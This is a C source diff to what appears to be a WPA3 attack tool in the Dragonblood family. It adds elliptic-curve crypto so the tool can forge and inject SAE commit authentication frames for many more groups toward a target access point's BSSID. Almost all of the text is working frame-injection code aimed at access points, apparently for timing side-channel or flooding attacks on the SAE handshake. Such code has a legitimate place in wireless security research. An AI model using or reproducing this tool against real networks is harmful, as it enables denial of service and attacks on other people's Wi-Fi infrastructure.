@@ -29,6 +29,10 @@
 #include <poll.h>
 #include <assert.h>
 
+#include <openssl/evp.h>
+#include <openssl/ec.h>
+#include <openssl/bn.h>
+
 #include "aircrack-osdep/osdep.h"
 #include "aircrack-osdep/network.h"
 #include "aircrack-util/common.h"
@@ -49,6 +53,19 @@
 #define RATE_54M 54000000
 
 #define USED_RATE RATE_54M
+
+unsigned char AUTH_REQ_SAE_COMMIT_ECC_HEADER[] = 
+	/* 802.11 header */ \
+	"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
+	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"                                 \
+	/* SAE Commit frame */                                             \
+	"\x03\x00\x01\x00\x00\x00";
+	// Next is:
+	// 2-bytes for the group id
+	// scalar
+	// x coordinate
+	// y coordinate
+size_t AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_ECC_HEADER) - 1;
 
 unsigned char AUTH_REQ_SAE_COMMIT_GROUP_22[] = 
 	/* 802.11 header */ \
@@ -178,6 +195,18 @@ static void sighandler(int signum)
 	if (signum == SIGPIPE) printf("broken pipe!\n");
 }
 
+struct state_ecc {
+	const EC_GROUP *group;
+	const EC_POINT *generator;
+	EC_POINT *element;
+	BIGNUM *prime;
+	BIGNUM *a;
+	BIGNUM *b;
+	BIGNUM *order;
+	BN_CTX *bnctx;
+	BIGNUM *scalar;
+};
+
 static struct state
 {
 	struct wif *wi;
@@ -199,6 +228,9 @@ static struct state
 	int started_clogging;
 	int rate;
 	int interval;
+
+	// Elliptic curve crypto
+	struct state_ecc ecc;
 } _state;
 
 static struct state * get_state(void) { return &_state; }
@@ -249,28 +281,6 @@ card_write(struct state *state, void *buf, int len, struct tx_info *ti)
 	return wi_write(state->wi, buf, len, ti);
 }
 
-#if 0
-static int card_get_mac(struct state *state, unsigned char * mac)
-{
-	return wi_get_mac(state->wi, mac);
-}
-
-static int card_get_monitor(struct state *state)
-{
-	return wi_get_monitor(state->wi);
-}
-
-static int card_get_rate(struct state *state)
-{
-	return wi_get_rate(state->wi);
-}
-
-static int card_get_chan(struct state *state)
-{
-	return wi_get_channel(state->wi);
-}
-#endif
-
 static void
 open_card(struct state *state, char * dev, int chan)
 {
@@ -280,23 +290,93 @@ open_card(struct state *state, char * dev, int chan)
 	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
 }
 
+// TODO: Share with dragondrain
+int bignum2bin(BIGNUM *num, uint8_t *buf, size_t outlen)
+{
+	int num_bytes = BN_num_bytes(num);
+	int offset = outlen - num_bytes;
+
+	memset(buf, 0, offset);
+	BN_bn2bin(num, buf + offset);
+
+	return 0;
+}
+
+// TODO: Share with dragondrain
+uint8_t * ecc_point2bin(struct state *state, EC_POINT *point, uint8_t *out)
+{
+	int num_bytes = BN_num_bytes(state->ecc.prime);
+	BIGNUM *bignum_x = BN_new();
+	BIGNUM *bignum_y = BN_new();
+	// XXX check allocation results
+
+	// XXX check return value
+	EC_POINT_get_affine_coordinates_GFp(state->ecc.group, point, bignum_x, bignum_y, state->ecc.bnctx);
+
+	// XXX check if out buffer is large enough
+	bignum2bin(bignum_x, out, num_bytes);
+	bignum2bin(bignum_y, out + num_bytes, num_bytes);
+
+	BN_free(bignum_y);
+	BN_free(bignum_x);
+
+	return out + 2 * num_bytes;
+}
+
+
+static size_t generate_sae_commit_ecc(struct state *state, uint8_t *buf, size_t len)
+{
+	uint8_t *pos = buf;
+
+	// Copy the header
+	memcpy(pos, AUTH_REQ_SAE_COMMIT_ECC_HEADER, AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE);
+	pos += AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE;
+
+	// Fill in the group number
+	uint16_t *commit_groupid = (uint16_t*)pos;
+	*commit_groupid = state->group;
+	pos += 2;
+
+	// Copy the scalar
+	int num_bytes = BN_num_bytes(state->ecc.prime);
+	bignum2bin(state->ecc.scalar, pos, num_bytes);
+	pos += num_bytes;
+
+	// Copy the element
+	pos = ecc_point2bin(state, state->ecc.element, pos);
+
+	// Return the length of the constructed frame
+	return pos - buf;
+}
+
 static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
 {
-	unsigned char *buf;
-	int len;
+	unsigned char buf[2048] = {0};
+	int len= 0;
 
 	switch (state->group) {
 	case 22:
-		buf = AUTH_REQ_SAE_COMMIT_GROUP_22;
 		len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
+		memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
 		break;
 	case 23:
-		buf = AUTH_REQ_SAE_COMMIT_GROUP_23;
 		len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
+		memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
 		break;
 	case 24:
-		buf = AUTH_REQ_SAE_COMMIT_GROUP_24;
 		len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
+		memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
+		break;
+	case 19:
+	case 20:
+	case 21:
+	case 25:
+	case 26:
+	case 27:
+	case 28:
+	case 29:
+	case 30:
+		len = generate_sae_commit_ecc(state, buf, sizeof(buf));
 		break;
 	default:
 		debug(state, 1, "Internal error: unsupported group %d in %s\n", state->group, __FUNCTION__);
@@ -608,6 +688,106 @@ static void event_loop(struct state *state, char * dev, int chan)
 	}
 }
 
+// TODO: Share this between dragondrain
+int iana_to_openssl_id(int groupid)
+{
+	switch (groupid) {
+	case 19: return NID_X9_62_prime256v1;
+	case 20: return NID_secp384r1;
+	case 21: return NID_secp521r1;
+	case 25: return NID_X9_62_prime192v1;
+	case 26: return NID_secp224r1;
+	case 27: return NID_brainpoolP224r1;
+	case 28: return NID_brainpoolP256r1;
+	case 29: return NID_brainpoolP384r1;
+	case 30: return NID_brainpoolP512r1;
+	default: return -1;
+	}
+}
+
+// TODO: Share this between dragondrain
+void free_crypto_context(struct state_ecc *state_ecc)
+{
+	BN_free(state_ecc->prime);
+	BN_free(state_ecc->a);
+	BN_free(state_ecc->b);
+	BN_free(state_ecc->order);
+	BN_free(state_ecc->scalar);
+	EC_POINT_free(state_ecc->element);
+	BN_CTX_free(state_ecc->bnctx);
+}
+
+// TODO: Share this between dragondrain
+int initialize_ecc_crypto(struct state_ecc *state_ecc, int group)
+{
+	BIGNUM *randbn;
+	int openssl_groupid;
+
+	openssl_groupid = iana_to_openssl_id(group);
+	if (openssl_groupid == -1) {
+		fprintf(stderr, "Unrecognized curve ID: %d\n", group);
+		return -1;
+	}
+
+	state_ecc->group = EC_GROUP_new_by_curve_name(openssl_groupid);
+	if (state_ecc->group == NULL) {
+		fprintf(stderr, "OpenSSL failed to load curve %d\n", group);
+		return -1;
+	}
+
+	state_ecc->bnctx = BN_CTX_new();
+	state_ecc->prime = BN_new();
+	state_ecc->a = BN_new();
+	state_ecc->b = BN_new();
+	state_ecc->order = BN_new();
+	state_ecc->scalar = BN_new();
+	state_ecc->element = EC_POINT_new(state_ecc->group);
+	if (state_ecc->bnctx == NULL || state_ecc->prime == NULL || state_ecc->a == NULL ||
+	    state_ecc->b == NULL || state_ecc->order == NULL || state_ecc->scalar == NULL ||
+	    state_ecc->element == NULL) {
+		fprintf(stderr, "Failed to allocate memory for BIGNUMs and/or ECC points\n");
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	if (!EC_GROUP_get_curve_GFp(state_ecc->group, state_ecc->prime, state_ecc->a, state_ecc->b, state_ecc->bnctx) ||
+	    !EC_GROUP_get_order(state_ecc->group, state_ecc->order, state_ecc->bnctx)) {
+		fprintf(stderr, "Failed to get parameters of group %d\n", group);
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	state_ecc->generator = EC_GROUP_get0_generator(state_ecc->group);
+	if (state_ecc->generator == NULL || state_ecc->element == NULL) {
+		fprintf(stderr, "Failed to get the generator of group %d\n", group);
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	randbn = BN_new();
+	if (randbn == NULL) {
+		fprintf(stderr, "Failed to element BIGNUM\n");
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	// For our purposes, a 64-bit random number is more than enough
+	BN_pseudo_rand(randbn, 64, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
+	BN_pseudo_rand(state_ecc->scalar, BN_num_bits(state_ecc->order) - 1, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
+
+	if (!EC_POINT_mul(state_ecc->group, state_ecc->element, NULL, state_ecc->generator, randbn, state_ecc->bnctx)) {
+		fprintf(stderr, "EC_POINT_mul failed\n");
+		BN_free(randbn);
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	printf("Initialized ECC crypto parameters\n");
+
+	BN_free(randbn);
+	return 0;
+}
+
 static void usage(char * p)
 {
 	char * version_info
@@ -706,8 +886,8 @@ int main(int argc, char * argv[])
 
 	if (!device || chan <= 0 || memcmp(state->bssid, ZERO, 6) == 0)
 		usage(argv[0]);
-	if (state->group != 22 && state->group != 23 && state->group != 24) {
-		fprintf(stderr, "Only group 22, 23, or 24 is supported\n");
+	if ((state->group < 22 || state->group > 24) && initialize_ecc_crypto(&state->ecc, state->group)) {
+		fprintf(stderr, "Group %d is not supported\n", state->group);
 		exit(1);
 	}
 
